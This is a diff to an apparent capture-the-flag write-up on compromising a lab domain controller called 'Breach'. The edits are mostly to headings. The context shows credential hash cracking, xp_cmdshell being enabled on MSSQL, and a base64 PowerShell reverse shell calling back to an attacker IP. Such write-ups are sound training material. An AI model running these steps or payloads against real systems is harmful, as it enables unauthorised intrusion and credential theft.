@@ -354,6 +354,8 @@ SMB         10.129.8.90     445    BREACHDC         SYSVOL                      
 SMB         10.129.8.90     445    BREACHDC         Users           READ
 ```
 
+@@ Initial foothold
+
 ### share and users shares
 
 Starting with the share named share, it's quite interesting that we can write to it. Looking at it's contents, I can see three users which I'll note. `Recurse on` will allow me to go through the share quicker.
@@ -565,7 +567,9 @@ JULIA.WONG::BREACH:f0e657876e73a278:309f791a2fa28445ed7f4a47d370b3da:01010000000
 
 After just some seconds, the hash cracked succesfully and we have the credentials of julia.wong.
 
-### Lateral Movement
+## Lateral Movement
+
+### More enumration
 
 First thing I'll check with the newly obtained credentials is to run another enum4linux scan, as well as re-check the shares in smb. While we do this, it's good to let Bloodhound collect the data in the background.
 
@@ -1297,7 +1301,7 @@ INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'show advanced options
 INFO(BREACHDC\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
 ```
 
-Now I can run commands, I'll prompt for a base64 encoded reverse shell.
+Now we're able to run commands, I'll prompt for a base64 encoded reverse shell.
 
 ```bash
 SQL (BREACH\Administrator  dbo@master)> xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAd...."
@@ -1314,6 +1318,8 @@ connect to [10.10.14.16] from (UNKNOWN) [10.129.9.183] 52666
 PS C:\Windows\system32> whoami
 breach\svc_mssql
 ```
+
+## Privilege escalation
 
 ### Shell as SYSTEM
 
